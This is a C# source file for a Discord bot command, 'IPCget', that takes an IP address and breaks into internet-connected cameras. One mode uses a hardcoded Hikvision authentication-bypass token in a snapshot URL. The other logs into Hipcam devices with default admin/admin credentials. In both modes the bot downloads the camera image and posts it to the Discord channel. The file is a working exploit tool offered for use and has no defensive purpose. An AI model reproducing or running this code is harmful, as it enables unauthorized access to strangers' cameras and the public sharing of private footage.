using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;
using Discord;
using Discord.Commands;
using System.Drawing;

namespace dicpicbotc.Modules
{
    public class IPCget : ModuleBase<SocketCommandContext>
    {
        [Command("IPCget")]
        public async Task IPAsync(string ip2 = "", string setting = "", string userpass = "")
        {
            string dppath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "/dicpicbot_data/ipcsnapshots";

            DirectoryInfo d = new DirectoryInfo(dppath);
            foreach(FileInfo f in d.GetFiles())
            {
                File.Delete(f.FullName);
            }

            Console.WriteLine("[info] cleaned up images folder.");

            WebClient w = new WebClient();

            Random random = new Random();

            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            string rand = new string(Enumerable.Repeat(chars, 5).Select(s => s[random.Next(s.Length)]).ToArray());

            

            if (setting == "-hiksploit")
            {
                await ReplyAsync("processing...");

                if (!(ip2.Contains("http://") || ip2.Contains("https://")))
                {
                    ip2 = "http://" + ip2;
                }

                try
                {
                    string ip2r = ip2 + "/onvif-http/snapshot?auth=YWRtaW46MTEK";
                    w.DownloadFile(ip2r, dppath + "/" + rand + ".jpg");

                    byte[] temp = File.ReadAllBytes(dppath + "/" + rand + ".jpg");
                    if (temp.Length < 1000)
                    {
                        throw new Exception("File too small");
                    }

                    await Context.Channel.SendFileAsync(dppath + "/" + rand + ".jpg", ip2 + " using the hikvision login bypass explot");
                    try
                    {
                        File.Delete(dppath + "/" + rand + ".jpg");
                        Console.WriteLine("[notif] file deleted after posting.");
                    }
                    catch
                    {
                        Console.WriteLine("[warn] file could not be deleted.");
                    }

                }
                catch
                {
                    await ReplyAsync("that ip was invalid or the camera is not exploitable.");
                }
            }
            else if(setting == "-hipcam")
            {
                await ReplyAsync("processing...");

                if (!(ip2.Contains("http://") || ip2.Contains("https://")))
                {
                    ip2 = "http://" + ip2;
                }

                try
                {
                    string ip2r = ip2 + "/tmpfs/auto.jpg";
                    w.Credentials = new NetworkCredential("admin", "admin");
                    w.DownloadFile(ip2r, dppath + "/" + rand + ".jpg");

                    byte[] temp = File.ReadAllBytes(dppath + "/" + rand + ".jpg");
                    if (temp.Length < 1000)
                    {
                        throw new Exception("File too small");
                    }

                    await Context.Channel.SendFileAsync(dppath + "/" + rand + ".jpg", ip2 + " using hipcams default directory and password");
                    try
                    {
                        File.Delete(dppath + "/" + rand + ".jpg");
                        Console.WriteLine("[notif] file deleted after posting.");
                    }
                    catch
                    {
                        Console.WriteLine("[warn] file could not be deleted.");
                    }

                }
                catch
                {
                    await ReplyAsync("that ip was invalid or the camera is not exploitable.");
                }
            }
            else
            {
                await ReplyAsync("invalid command. usage: dp.IPCget [ip] [flag] (-hiksploit, -hipcam)");
            }

        }
    }
}
